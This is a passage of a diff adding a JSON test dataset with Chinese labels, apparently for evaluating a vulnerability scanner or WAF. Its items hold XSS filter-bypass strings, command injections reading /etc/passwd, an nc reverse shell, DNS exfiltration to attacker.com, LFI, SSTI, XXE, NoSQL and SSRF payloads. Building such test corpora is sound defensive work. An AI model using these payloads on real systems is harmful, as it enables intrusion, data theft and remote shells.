+    "payload": "<img src=x onerror=\"eval(location.hash.slice(1))\">#alert(1)",
+    "description": "location.hash",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_047",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<img src=x onerror=\"eval(document.cookie)\">",
+    "description": "document.cookie",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_048",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<script>document.write('<img src=x onerror=alert(1)>')</script>",
+    "description": "document.write",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_049",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<div id=x></div><script>document.getElementById(\"x\").innerHTML=\"<img src=x onerror=alert(1)>\"</script>",
+    "description": "innerHTML",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_050",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<img src=x onerror=\"setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),0)\">",
+    "description": "setTimeout",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_051",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<scr\u0000ipt>alert(1)</scr\u0000ipt>",
+    "description": "空字节",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_052",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<sc%00ript>alert(1)</sc%00ript>",
+    "description": "%00截断",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_053",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<img\nsrc=x\nonerror=alert(1)>",
+    "description": "空格变体",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_054",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<img src=x onerror=alert`1`>",
+    "description": "反引号",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_055",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<img/src=x/onerror=alert(1)>",
+    "description": "属性拆分src",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_056",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<img \"\"\"><script>alert(1)</script>\">",
+    "description": "属性拆分双引号",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_057",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "\"><script>alert(1)</script>",
+    "description": "多余双引号",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_058",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "' onerror='alert(1)",
+    "description": "闭合属性",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_059",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "</textarea><script>alert(1)</script>",
+    "description": "闭合标签",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_060",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<input type=\"image\" src=x onerror=alert(1)>",
+    "description": "input type=image",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_061",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<isindex type=image src=1 onerror=alert(1)>",
+    "description": "isindex action",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_062",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<table background=\"javascript:alert(1)\">",
+    "description": "table background",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_063",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
+    "description": "meta refresh",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_064",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<link rel=\"stylesheet\" href=\"javascript:alert(1)\">",
+    "description": "link stylesheet",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_065",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<video poster=\"javascript:alert(1)\">",
+    "description": "html5 video poster",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_066",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<div onfocusin=alert(1) tabindex=1>",
+    "description": "事件 onfocusin",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_067",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<img src=x\u000eonerror=alert(1)>",
+    "description": "非打印字符",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_cmdi_001",
+    "category": "命令注入",
+    "subcategory": "分隔符/编码/命令替换绕过",
+    "payload": "127.0.0.1; cat /etc/passwd",
+    "description": "分号",
+    "expected_type": "命令注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_cmdi_002",
+    "category": "命令注入",
+    "subcategory": "分隔符/编码/命令替换绕过",
+    "payload": "127.0.0.1 | cat /etc/passwd",
+    "description": "管道符",
+    "expected_type": "命令注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_cmdi_003",
+    "category": "命令注入",
+    "subcategory": "分隔符/编码/命令替换绕过",
+    "payload": "127.0.0.1 && cat /etc/passwd",
+    "description": "逻辑AND",
+    "expected_type": "命令注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_cmdi_004",
+    "category": "命令注入",
+    "subcategory": "分隔符/编码/命令替换绕过",
+    "payload": "127.0.0.1 || cat /etc/passwd",
+    "description": "逻辑OR",
+    "expected_type": "命令注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_cmdi_005",
+    "category": "命令注入",
+    "subcategory": "分隔符/编码/命令替换绕过",
+    "payload": "127.0.0.1`cat /etc/passwd`",
+    "description": "反引号嵌套",
+    "expected_type": "命令注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_cmdi_006",
+    "category": "命令注入",
+    "subcategory": "分隔符/编码/命令替换绕过",
+    "payload": "127.0.0.1$(cat /etc/passwd)",
+    "description": "美元括号",
+    "expected_type": "命令注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_cmdi_007",
+    "category": "命令注入",
+    "subcategory": "分隔符/编码/命令替换绕过",
+    "payload": "127.0.0.1%0acat /etc/passwd",
+    "description": "换行符",
+    "expected_type": "命令注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_cmdi_008",
+    "category": "命令注入",
+    "subcategory": "分隔符/编码/命令替换绕过",
+    "payload": "127.0.0.1%3Bcat%20/etc/passwd",
+    "description": "URL编码 分号",
+    "expected_type": "命令注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_cmdi_009",
+    "category": "命令注入",
+    "subcategory": "分隔符/编码/命令替换绕过",
+    "payload": "127.0.0.1%7Ccat%20/etc/passwd",
+    "description": "URL编码 管道",
+    "expected_type": "命令注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_cmdi_010",
+    "category": "命令注入",
+    "subcategory": "分隔符/编码/命令替换绕过",
+    "payload": "127.0.0.1%26%26cat%20/etc/passwd",
+    "description": "URL编码 AND",
+    "expected_type": "命令注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_cmdi_011",
+    "category": "命令注入",
+    "subcategory": "分隔符/编码/命令替换绕过",
+    "payload": "127.0.0.1%60cat%20/etc/passwd%60",
+    "description": "URL编码 反引号",
+    "expected_type": "命令注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_cmdi_012",
+    "category": "命令注入",
+    "subcategory": "分隔符/编码/命令替换绕过",
+    "payload": "127.0.0.1;cat${IFS}/etc/passwd",
+    "description": "空格绕过 ${IFS}",
+    "expected_type": "命令注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_cmdi_013",
+    "category": "命令注入",
+    "subcategory": "分隔符/编码/命令替换绕过",
+    "payload": "127.0.0.1;cat\t/etc/passwd",
+    "description": "空格绕过 TAB",
+    "expected_type": "命令注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_cmdi_014",
+    "category": "命令注入",
+    "subcategory": "分隔符/编码/命令替换绕过",
+    "payload": "127.0.0.1;c'a't /etc/passwd",
+    "description": "命令拼接 cat",
+    "expected_type": "命令注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_cmdi_015",
+    "category": "命令注入",
+    "subcategory": "分隔符/编码/命令替换绕过",
+    "payload": "127.0.0.1;$(echo cat) /etc/passwd",
+    "description": "命令拼接 echo",
+    "expected_type": "命令注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_cmdi_016",
+    "category": "命令注入",
+    "subcategory": "分隔符/编码/命令替换绕过",
+    "payload": "127.0.0.1;echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh",
+    "description": "base64编码执行",
+    "expected_type": "命令注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_cmdi_017",
+    "category": "命令注入",
+    "subcategory": "分隔符/编码/命令替换绕过",
+    "payload": "127.0.0.1;echo 0x636174202f6574632f706173737764 | xxd -r -p | sh",
+    "description": "十六进制执行",
+    "expected_type": "命令注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_cmdi_018",
+    "category": "命令注入",
+    "subcategory": "分隔符/编码/命令替换绕过",
+    "payload": "127.0.0.1;/???/??t /???/????wd",
+    "description": "通配符 cat",
+    "expected_type": "命令注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_cmdi_019",
+    "category": "命令注入",
+    "subcategory": "分隔符/编码/命令替换绕过",
+    "payload": "127.0.0.1;cat /etc/pass*",
+    "description": "通配符 passwd",
+    "expected_type": "命令注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_cmdi_020",
+    "category": "命令注入",
+    "subcategory": "分隔符/编码/命令替换绕过",
+    "payload": "127.0.0.1;head -1 /etc/passwd",
+    "description": "head替代cat",
+    "expected_type": "命令注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_cmdi_021",
+    "category": "命令注入",
+    "subcategory": "分隔符/编码/命令替换绕过",
+    "payload": "127.0.0.1;tail -1 /etc/passwd",
+    "description": "tail替代cat",
+    "expected_type": "命令注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_cmdi_022",
+    "category": "命令注入",
+    "subcategory": "分隔符/编码/命令替换绕过",
+    "payload": "127.0.0.1;more /etc/passwd",
+    "description": "more替代cat",
+    "expected_type": "命令注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_cmdi_023",
+    "category": "命令注入",
+    "subcategory": "分隔符/编码/命令替换绕过",
+    "payload": "127.0.0.1;less /etc/passwd",
+    "description": "less替代cat",
+    "expected_type": "命令注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_cmdi_024",
+    "category": "命令注入",
+    "subcategory": "分隔符/编码/命令替换绕过",
+    "payload": "127.0.0.1;awk 1 /etc/passwd",
+    "description": "awk替代cat",
+    "expected_type": "命令注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_cmdi_025",
+    "category": "命令注入",
+    "subcategory": "分隔符/编码/命令替换绕过",
+    "payload": "127.0.0.1;curl file:///etc/passwd",
+    "description": "curl替代cat",
+    "expected_type": "命令注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_cmdi_026",
+    "category": "命令注入",
+    "subcategory": "分隔符/编码/命令替换绕过",
+    "payload": "127.0.0.1;wget -O- file:///etc/passwd",
+    "description": "wget替代cat",
+    "expected_type": "命令注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_cmdi_027",
+    "category": "命令注入",
+    "subcategory": "分隔符/编码/命令替换绕过",
+    "payload": "127.0.0.1;nc -e /bin/sh 192.168.1.1 4444",
+    "description": "nc反向shell",
+    "expected_type": "命令注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_cmdi_028",
+    "category": "命令注入",
+    "subcategory": "分隔符/编码/命令替换绕过",
+    "payload": "127.0.0.1;nslookup `whoami`.attacker.com",
+    "description": "DNS数据外泄",
+    "expected_type": "命令注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_cmdi_029",
+    "category": "命令注入",
+    "subcategory": "分隔符/编码/命令替换绕过",
+    "payload": "127.0.0.1;sleep 5",
+    "description": "睡眠探测",
+    "expected_type": "命令注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_lfi_001",
+    "category": "文件包含",
+    "subcategory": "路径编码/变体绕过",
+    "payload": "../../../../etc/passwd",
+    "description": "标准",
+    "expected_type": "文件包含",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_lfi_002",
+    "category": "文件包含",
+    "subcategory": "路径编码/变体绕过",
+    "payload": "/etc/passwd",
+    "description": "绝对路径",
+    "expected_type": "文件包含",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_lfi_003",
+    "category": "文件包含",
+    "subcategory": "路径编码/变体绕过",
+    "payload": "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+    "description": "URL编码 点",
+    "expected_type": "文件包含",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_lfi_004",
+    "category": "文件包含",
+    "subcategory": "路径编码/变体绕过",
+    "payload": "..%2f..%2f..%2f..%2fetc%2fpasswd",
+    "description": "URL编码 斜杠",
+    "expected_type": "文件包含",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_lfi_005",
+    "category": "文件包含",
+    "subcategory": "路径编码/变体绕过",
+    "payload": "..%252f..%252f..%252f..%252fetc%252fpasswd",
+    "description": "双重URL编码",
+    "expected_type": "文件包含",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_lfi_006",
+    "category": "文件包含",
+    "subcategory": "路径编码/变体绕过",
+    "payload": "\\u002e\\u002e/\\u002e\\u002e/\\u002e\\u002e/\\u002e\\u002e/etc/passwd",
+    "description": "Unicode编码 点",
+    "expected_type": "文件包含",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_lfi_007",
+    "category": "文件包含",
+    "subcategory": "路径编码/变体绕过",
+    "payload": "..\\u2215..\\u2215..\\u2215..\\u2215etc\\u2215passwd",
+    "description": "Unicode编码 斜杠",
+    "expected_type": "文件包含",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_lfi_008",
+    "category": "文件包含",
+    "subcategory": "路径编码/变体绕过",
+    "payload": "../../../../etc/passwd%00",
+    "description": "NULL字节截断",
+    "expected_type": "文件包含",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_lfi_009",
+    "category": "文件包含",
+    "subcategory": "路径编码/变体绕过",
+    "payload": "../../../../etc/passwd%00.html",
+    "description": "NULL字节截断 html",
+    "expected_type": "文件包含",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_lfi_010",
+    "category": "文件包含",
+    "subcategory": "路径编码/变体绕过",
+    "payload": "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+    "description": "Windows反斜杠",
+    "expected_type": "文件包含",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_lfi_011",
+    "category": "文件包含",
+    "subcategory": "路径编码/变体绕过",
+    "payload": "..\\../..\\../etc/passwd",
+    "description": "混合斜杠",
+    "expected_type": "文件包含",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_lfi_012",
+    "category": "文件包含",
+    "subcategory": "路径编码/变体绕过",
+    "payload": "php://filter/convert.base64-encode/resource=index.php",
+    "description": "PHP wrapper php://",
+    "expected_type": "文件包含",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_lfi_013",
+    "category": "文件包含",
+    "subcategory": "路径编码/变体绕过",
+    "payload": "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
+    "description": "PHP wrapper data://",
+    "expected_type": "文件包含",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_lfi_014",
+    "category": "文件包含",
+    "subcategory": "路径编码/变体绕过",
+    "payload": "expect://id",
+    "description": "PHP wrapper expect://",
+    "expected_type": "文件包含",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_lfi_015",
+    "category": "文件包含",
+    "subcategory": "路径编码/变体绕过",
+    "payload": "php://input",
+    "description": "PHP wrapper input://",
+    "expected_type": "文件包含",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_lfi_016",
+    "category": "文件包含",
+    "subcategory": "路径编码/变体绕过",
+    "payload": "....//....//....//....//etc/passwd",
+    "description": "filter双写绕过",
+    "expected_type": "文件包含",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_lfi_017",
+    "category": "文件包含",
+    "subcategory": "路径编码/变体绕过",
+    "payload": "..././..././..././..././etc/passwd",
+    "description": "filter三写绕过",
+    "expected_type": "文件包含",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_lfi_018",
+    "category": "文件包含",
+    "subcategory": "路径编码/变体绕过",
+    "payload": "\\\\attacker\\share\\file",
+    "description": "UNC路径 Windows",
+    "expected_type": "文件包含",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_lfi_019",
+    "category": "文件包含",
+    "subcategory": "路径编码/变体绕过",
+    "payload": "..%252f..%252f..%252f..%252fetc%252fpasswd%00",
+    "description": "编码与截断组合",
+    "expected_type": "文件包含",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_waf_001",
+    "category": "WAF绕过/综合",
+    "subcategory": "WAF专项/组合攻击绕过",
+    "payload": "1'/**/UNION/**/SEL/**/ECT/**/NULL--",
+    "description": "分块传输 SQLi",
+    "expected_type": "变体",
+    "expected_vulnerable": true,
+    "difficulty": "hard"
+  },
+  {
+    "id": "adv_waf_002",
+    "category": "WAF绕过/综合",
+    "subcategory": "WAF专项/组合攻击绕过",
+    "payload": "<scr/**/ipt>al/**/ert(1)</scr/**/ipt>",
+    "description": "分块传输 XSS",
+    "expected_type": "变体",
+    "expected_vulnerable": true,
+    "difficulty": "hard"
+  },
+  {
+    "id": "adv_waf_003",
+    "category": "WAF绕过/综合",
+    "subcategory": "WAF专项/组合攻击绕过",
+    "payload": "127.0.0.1;c/**/at /etc/passwd",
+    "description": "分块传输 CMDi",
+    "expected_type": "变体",
+    "expected_vulnerable": true,
+    "difficulty": "hard"
+  },
+  {
+    "id": "adv_waf_004",
+    "category": "WAF绕过/综合",
+    "subcategory": "WAF专项/组合攻击绕过",
+    "payload": "id=1&id=1' OR 1=1--",
+    "description": "HTTP参数污染",
+    "expected_type": "变体",
+    "expected_vulnerable": true,
+    "difficulty": "hard"
+  },
+  {
+    "id": "adv_waf_005",
+    "category": "WAF绕过/综合",
+    "subcategory": "WAF专项/组合攻击绕过",
+    "payload": "%25252525252527252525252520OR%252525252525201%2525252525253D1",
+    "description": "七层编码 SQLi",
+    "expected_type": "变体",
+    "expected_vulnerable": true,
+    "difficulty": "hard"
+  },
+  {
+    "id": "adv_waf_006",
+    "category": "WAF绕过/综合",
+    "subcategory": "WAF专项/组合攻击绕过",
+    "payload": "%2525253Cscript%2525253Ealert(1)%2525253C%2525252Fscript%2525253E",
+    "description": "五层编码 XSS",
+    "expected_type": "变体",
+    "expected_vulnerable": true,
+    "difficulty": "hard"
+  },
+  {
+    "id": "adv_waf_007",
+    "category": "WAF绕过/综合",
+    "subcategory": "WAF专项/组合攻击绕过",
+    "payload": "GET /?id=1' OR 1=1-- HTTP/1.1\nHost: attacker.com\nX-Forwarded-For: 1.1.1.1",
+    "description": "Host头 SQLi",
+    "expected_type": "变体",
+    "expected_vulnerable": true,
+    "difficulty": "hard"
+  },
+  {
+    "id": "adv_waf_008",
+    "category": "WAF绕过/综合",
+    "subcategory": "WAF专项/组合攻击绕过",
+    "payload": "POST / HTTP/1.1\nContent-Type: text/plain\n\na' OR 1=1--",
+    "description": "Content-Type text/plain",
+    "expected_type": "变体",
+    "expected_vulnerable": true,
+    "difficulty": "hard"
+  },
+  {
+    "id": "adv_waf_009",
+    "category": "WAF绕过/综合",
+    "subcategory": "WAF专项/组合攻击绕过",
+    "payload": "POST / HTTP/1.1\nContent-Type: multipart/form-data; boundary=x\n\n--x\n\na' OR 1=1--\n--x--",
+    "description": "Content-Type multipart",
+    "expected_type": "变体",
+    "expected_vulnerable": true,
+    "difficulty": "hard"
+  },
+  {
+    "id": "adv_waf_010",
+    "category": "WAF绕过/综合",
+    "subcategory": "WAF专项/组合攻击绕过",
+    "payload": "PUT /?id=1' OR 1=1-- HTTP/1.1",
+    "description": "PUT方法 SQLi",
+    "expected_type": "变体",
+    "expected_vulnerable": true,
+    "difficulty": "hard"
+  },
+  {
+    "id": "adv_waf_011",
+    "category": "WAF绕过/综合",
+    "subcategory": "WAF专项/组合攻击绕过",
+    "payload": "OPTIONS / HTTP/1.1",
+    "description": "OPTIONS方法 探测",
+    "expected_type": "变体",
+    "expected_vulnerable": true,
+    "difficulty": "hard"
+  },
+  {
+    "id": "adv_waf_012",
+    "category": "WAF绕过/综合",
+    "subcategory": "WAF专项/组合攻击绕过",
+    "payload": "1'/**/ORDER/**/BY/**/1--",
+    "description": "fragment绕过 SQLi",
+    "expected_type": "变体",
+    "expected_vulnerable": true,
+    "difficulty": "hard"
+  },
+  {
+    "id": "adv_waf_013",
+    "category": "WAF绕过/综合",
+    "subcategory": "WAF专项/组合攻击绕过",
+    "payload": "GET / HTTP/1.1\nTransfer-Encoding: chunked\n\n1\n1\n0\n\n",
+    "description": "Transfer-Encoding chunked",
+    "expected_type": "变体",
+    "expected_vulnerable": true,
+    "difficulty": "hard"
+  },
+  {
+    "id": "adv_waf_014",
+    "category": "WAF绕过/综合",
+    "subcategory": "WAF专项/组合攻击绕过",
+    "payload": "1' OR 1=1 UNION SELECT '<script>alert(1)</script>'--",
+    "description": "SQLi + XSS",
+    "expected_type": "变体",
+    "expected_vulnerable": true,
+    "difficulty": "hard"
+  },
+  {
+    "id": "adv_waf_015",
+    "category": "WAF绕过/综合",
+    "subcategory": "WAF专项/组合攻击绕过",
+    "payload": "127.0.0.1; SELECT * FROM users; cat /etc/passwd",
+    "description": "CMDi + SQLi",
+    "expected_type": "变体",
+    "expected_vulnerable": true,
+    "difficulty": "hard"
+  },
+  {
+    "id": "adv_waf_016",
+    "category": "WAF绕过/综合",
+    "subcategory": "WAF专项/组合攻击绕过",
+    "payload": "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}",
+    "description": "MongoDB $gt",
+    "expected_type": "变体",
+    "expected_vulnerable": true,
+    "difficulty": "hard"
+  },
+  {
+    "id": "adv_waf_017",
+    "category": "WAF绕过/综合",
+    "subcategory": "WAF专项/组合攻击绕过",
+    "payload": "{\"username\": {\"$regex\": \"admin.*\"}, \"password\": {\"$ne\": \"\"}}",
+    "description": "MongoDB $regex",
+    "expected_type": "变体",
+    "expected_vulnerable": true,
+    "difficulty": "hard"
+  },
+  {
+    "id": "adv_waf_018",
+    "category": "WAF绕过/综合",
+    "subcategory": "WAF专项/组合攻击绕过",
+    "payload": "{\"$where\": \"sleep(5000)\"}",
+    "description": "MongoDB $where",
+    "expected_type": "变体",
+    "expected_vulnerable": true,
+    "difficulty": "hard"
+  },
+  {
+    "id": "adv_waf_019",
+    "category": "WAF绕过/综合",
+    "subcategory": "WAF专项/组合攻击绕过",
+    "payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+    "description": "SSTI Jinja2",
+    "expected_type": "变体",
+    "expected_vulnerable": true,
+    "difficulty": "hard"
+  },
+  {
+    "id": "adv_waf_020",
+    "category": "WAF绕过/综合",
+    "subcategory": "WAF专项/组合攻击绕过",
+    "payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+    "description": "SSTI Twig",
+    "expected_type": "变体",
+    "expected_vulnerable": true,
+    "difficulty": "hard"
+  },
+  {
+    "id": "adv_waf_021",
+    "category": "WAF绕过/综合",
+    "subcategory": "WAF专项/组合攻击绕过",
+    "payload": "http://127.0.0.1:8080/admin",
+    "description": "SSRF localhost",
+    "expected_type": "变体",
+    "expected_vulnerable": true,
+    "difficulty": "hard"
+  },
+  {
+    "id": "adv_waf_022",
+    "category": "WAF绕过/综合",
+    "subcategory": "WAF专项/组合攻击绕过",
+    "payload": "http://2130706433:8080/admin",
+    "description": "SSRF 十进制IP",
+    "expected_type": "变体",
+    "expected_vulnerable": true,
+    "difficulty": "hard"
+  },
+  {
+    "id": "adv_waf_023",
+    "category": "WAF绕过/综合",
+    "subcategory": "WAF专项/组合攻击绕过",
+    "payload": "http://[::1]:8080/admin",
+    "description": "SSRF IPv6",
+    "expected_type": "变体",
+    "expected_vulnerable": true,
+    "difficulty": "hard"
+  },
+  {
+    "id": "adv_waf_024",
+    "category": "WAF绕过/综合",
+    "subcategory": "WAF专项/组合攻击绕过",
+    "payload": "http://1.1.1.1@127.0.0.1:8080/admin",
+    "description": "SSRF DNS重绑定",
+    "expected_type": "变体",
+    "expected_vulnerable": true,
+    "difficulty": "hard"
+  },
+  {
+    "id": "adv_waf_025",
+    "category": "WAF绕过/综合",
+    "subcategory": "WAF专项/组合攻击绕过",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "description": "XXE 基础",
+    "expected_type": "变体",
+    "expected_vulnerable": true,
+    "difficulty": "hard"
+  },
+  {
+    "id": "adv_waf_026",
+    "category": "WAF绕过/综合",
+    "subcategory": "WAF专项/组合攻击绕过",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]>",
+    "description": "XXE 参数实体",
+    "expected_type": "变体",
+    "expected_vulnerable": true,
+    "difficulty": "hard"
+  },
+  {
+    "id": "adv_waf_027",
+    "category": "WAF绕过/综合",
+    "subcategory": "WAF专项/组合攻击绕过",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % start \"<![CDATA[\"><!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % end \"]]>\"><!ENTITY % dtd SYSTEM \"http://attacker.com/combine.dtd\">%dtd;]>",
+    "description": "XXE CDATA",
+    "expected_type": "变体",
+    "expected_vulnerable": true,
+    "difficulty": "hard"
+  },
+  {
+    "id": "adv_waf_028",
+    "category": "WAF绕过/综合",
+    "subcategory": "WAF专项/组合攻击绕过",
+    "payload": "1' OR 1=1-- (在 User-Agent 头中)",
+    "description": "UserAgent SQLi",
+    "expected_type": "变体",
+    "expected_vulnerable": true,
+    "difficulty": "hard"
+  },
+  {
+    "id": "adv_waf_029",
+    "category": "WAF绕过/综合",
+    "subcategory": "WAF专项/组合攻击绕过",
+    "payload": "1' OR SLEEP(5)-- (在 Referer 头中)",
